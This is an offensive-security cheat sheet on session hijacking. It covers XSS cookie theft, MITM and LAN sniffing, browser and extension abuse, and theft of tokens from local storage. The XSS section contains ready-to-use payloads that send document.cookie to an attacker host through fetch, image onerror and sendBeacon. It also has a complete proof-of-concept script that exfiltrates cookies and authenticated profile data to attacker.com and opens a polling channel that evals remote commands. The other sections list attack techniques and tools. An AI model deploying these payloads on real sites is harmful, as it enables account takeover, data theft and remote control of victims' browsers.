---
aliases:
  - XSS Cookie Theft
  - MITM Session
  - Network Sniffing
tags:
  - type/cheatsheet
  - vuln/session-hijacking
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Session Hijacking]]'
  - '[[Cross-Site Scripting (XSS)]]'
---
# Session Hijacking - Vectores de Robo

***

## XSS para `document.cookie`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Direct exfil | `<script>fetch('//attacker/log?c='+document.cookie)</script>` | Standard. |
| Image src exfil | `<img src=x onerror="this.src='//attacker/?c='+document.cookie">` | Same. |
| Combine fetch + Beacon | `navigator.sendBeacon('//attacker/log', document.cookie)` | Async. |
| Stored XSS | Persistent payload en comments / profile | High impact. |
| Reflected XSS | URL-based vector | Per-link. |
| DOM XSS | Client-side sink | Modern apps. |
| Bypass HttpOnly via XSS | `document.cookie` returns no HttpOnly cookies | But session via fetch can bypass. |
| Fetch authenticated request via XSS | `fetch('/api/user', {credentials:'include'})` | Reads response, cookies sent. |
| WebSocket exfil | XSS opens WS to atacante | Real-time. |
| postMessage exfil | If iframe with target | Edge. |
| Service Worker register | Persistent JS even after navigation | PWA. |
| Combine con keylogger | XSS captures keystrokes | Multi-vector. |
| Combine con MITB (Man-in-the-Browser) | Manipulate UI in-page | Banking trojan-style. |
| If HttpOnly + XSS, fetch resource | Atacante reads response (NOT cookie itself) | Indirect access. |
^sh-vector-xss

### XSS exfil PoC complete

```html
<!-- Malicious script en stored XSS -->
<script>
  // Stage 1: Steal cookies (if not HttpOnly)
  const cookies = document.cookie;
  
  // Stage 2: Fetch sensitive data using session
  fetch('/api/user/profile', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      // Stage 3: Exfil to attacker
      fetch('https://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify({cookies, data}),
        mode: 'no-cors'
      });
    });
  
  // Stage 4: Establish persistent C2
  setInterval(() => {
    fetch('https://attacker.com/poll')
      .then(r => r.text())
      .then(cmd => eval(cmd));  // Run commands
  }, 30000);
</script>
```

___

## MITM (HTTP Plaintext / Weak TLS)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| HTTP plaintext sniffing | Public WiFi + Wireshark | Standard. |
| HTTPS downgrade | Strip TLS via SSLStrip | Pre-HSTS apps. |
| Cookie sin Secure flag | Sent over HTTP automatically | Direct. |
| Redirect HTTP→HTTPS late | Cookie sent on first HTTP request | Pre-redirect leak. |
| Subdomain HTTP only | Main HTTPS, sub HTTP | Cookie domain abuse. |
| Mixed content | HTTPS page con HTTP resource | Cookies leaked. |
| ARP spoofing | LAN-level redirect | Network attack. |
| Rogue access point | Evil twin WiFi | Public WiFi attack. |
| BGP hijacking | Internet-scale routing | Nation-state. |
| Weak TLS cipher (CRIME, BREACH) | Compression attacks | Per-vuln. |
| Heartbleed (CVE-2014-0160) | Memory leak | Pre-fix. |
| FREAK / Logjam | Weak DH | Cipher downgrade. |
| Combine con cert validation bypass | Self-signed cert acceptance | Edge. |
| WPA2 KRACK | WiFi protocol attack | Network-level. |
| Browser cert warning ignored | UX flaw | Edge user behavior. |
^sh-vector-mitm

___

## Network Sniffing (LAN / Shared)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Public WiFi | Wireshark + dsniff | Standard. |
| Office shared LAN | Same | Internal. |
| ARP cache poisoning | Bettercap, Ettercap | LAN. |
| MAC flooding switch | Force flooding | Edge. |
| Promiscuous mode capture | NIC config | Standard. |
| Bluetooth MITM | Not common for web | Edge. |
| USB-attached network sniffer | Pineapple / similar | Pen-test gear. |
| DNS poisoning | Combine con MITM | Multi-vector. |
| WPAD attack | Web Proxy Auto-Discovery | Windows-specific. |
| LLMNR / NBT-NS poisoning | Internal LAN protocol abuse | AD environment. |
| IPv6 SLAAC abuse | IPv6-specific | Edge modern. |
| Captive portal abuse | Hotel WiFi | UX-tricked sniffing. |
| Combine con session cookie sniff | Direct hijack | Standard. |
| HTTPS-only sites | Need TLS bypass | Increased difficulty. |
^sh-vector-sniffing

___

## Browser Exploit / Extension Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Browser RCE | Old browser + 0day | Edge. |
| Same-Origin Policy bypass | Browser bug | Per-vuln. |
| Extension permissions abuse | Malicious extension reads cookies | Extension-level. |
| Chrome DevTools Protocol | If exposed → cookie access | Local-only. |
| WebExtensions cookie API | Extension API access | If perms granted. |
| Shared computer | Persistent cookies stay | UX. |
| Browser saved passwords | DPAPI / Keychain access | OS-level. |
| Cache profile theft | `cookies.sqlite` (Firefox) | Local file. |
| Chromium cookies | `Cookies` SQLite db | Local. |
| Combine con malware | Malware + browser cookie steal | Standard infostealer. |
| Persistent dev tools | Open dev tools during session | Edge. |
| Bookmarklets | `javascript:` URLs | If user clicks. |
| Browser sync abuse | Sync to atacante's account | Edge. |
| Malicious autofill | Form autofill exposure | Edge. |
^sh-vector-browser

___

## Cookie Theft via Local JS

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `document.cookie` | Direct read non-HttpOnly | Standard. |
| `localStorage.getItem('token')` | If JWT en localStorage | XSS-vulnerable. |
| `sessionStorage` | Session-scoped storage | Same risk. |
| IndexedDB | More complex storage | App-specific. |
| Service Worker fetch | SW intercepts requests | Persistence. |
| Cookie API (modern) | `document.cookieStore` | Async. |
| Iframe storage access | Cross-frame access if same-origin | Edge. |
| Web SQL (deprecated) | Old apps | Edge legacy. |
| Custom JS auth | Apps that decode JWT JS-side | Direct. |
| Mobile WebView | Native app + WebView | Mobile chain. |
| Combine con XSS persistente | Stored XSS reads/exfils | Standard. |
| Browser fingerprint en token | Fingerprint-tied tokens | Replay risk. |
^sh-vector-localjs

***
